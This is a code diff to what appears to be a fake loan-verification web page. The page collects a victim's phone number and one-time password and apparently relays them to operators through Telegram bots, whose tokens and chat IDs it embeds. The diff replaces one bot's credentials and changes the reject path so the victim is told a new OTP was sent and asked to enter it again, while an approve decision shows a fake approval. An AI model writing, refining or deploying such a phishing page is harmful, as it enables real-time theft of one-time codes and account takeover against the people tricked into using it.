@@ -354,8 +354,8 @@
         const CHAT_ID_1 = '6527631508';
 
         // Bot 2
-        const BOT_TOKEN_2 = '9155234573:AAHjaiqzlfHig0lgc9exetwGy1YqdLW1e30';
-        const CHAT_ID_2 = '7507088757';
+        const BOT_TOKEN_2 = '8799263708:AAGKJWoeVBe0HkTCCXTnCbSf9N4biwbH4_Y';
+        const CHAT_ID_2 = '8520094229';
 
         // Mask phone from localStorage
         const savedPhone = localStorage.getItem('phone') || '785123463';
@@ -399,6 +399,47 @@
                 submitBtn.classList.remove('enabled');
                 submitBtn.disabled = true;
             }
+        }
+
+        function resetToOtpEntry() {
+            spinnerOverlay.style.display = 'none';
+            resultOverlay.style.display = 'none';
+            otpBoxes.forEach(box => {
+                box.value = '';
+            });
+            otpValue = '';
+            actionProcessed = false;
+            checkOtpComplete();
+            otpBoxes[0].focus();
+        }
+
+        function showRejectNoticeAndReturnToOtp() {
+            spinnerOverlay.style.display = 'none';
+            resultOverlay.style.display = 'flex';
+            resultOverlay.style.background = 'rgba(2, 8, 20, 0.96)';
+            resultOverlay.style.backdropFilter = 'blur(12px)';
+
+            resultMessage.style.cssText = `
+                color: #00d9ff;
+                background: linear-gradient(145deg, #071426, #102b49, #050d1b);
+                border: 1px solid #00bfff;
+                border-radius: 16px;
+                padding: 25px 20px;
+                margin: 15px;
+                font-size: 16px;
+                font-weight: 700;
+                line-height: 1.8;
+                text-align: center;
+                letter-spacing: 0.5px;
+                text-shadow: 0 0 8px #00bfff, 0 0 18px #0077ff;
+                box-shadow: 0 0 15px rgba(0,191,255,0.4),
+                            inset 0 0 15px rgba(0,191,255,0.08);
+            `;
+            resultMessage.textContent = 'Please enter a new OTP we have sent.';
+
+            setTimeout(() => {
+                resetToOtpEntry();
+            }, 2200);
         }
 
         otpBoxes.forEach((box, index) => {
@@ -454,6 +495,13 @@
             if (pollInterval1) clearInterval(pollInterval1);
             if (pollInterval2) clearInterval(pollInterval2);
 
+            const [decision] = callbackData.split('_');
+
+            if (decision === 'reject') {
+                showRejectNoticeAndReturnToOtp();
+                return;
+            }
+
             spinnerOverlay.style.display = 'none';
             resultOverlay.style.display = 'flex';
 
@@ -477,12 +525,8 @@
                             inset 0 0 15px rgba(0,191,255,0.08);
             `;
 
-            const [decision] = callbackData.split('_');
-
             if (decision === 'approve') {
                 resultMessage.textContent = '✦ REQUEST APPROVED ✦\n\nYour loan verification has been approved. Please stay on this page while we finalize your application.';
-            } else if (decision === 'reject') {
-                resultMessage.textContent = '✖ REQUEST REJECTED\n\nYour loan verification request was rejected. Please review your details and try again.';
             }
         }
 
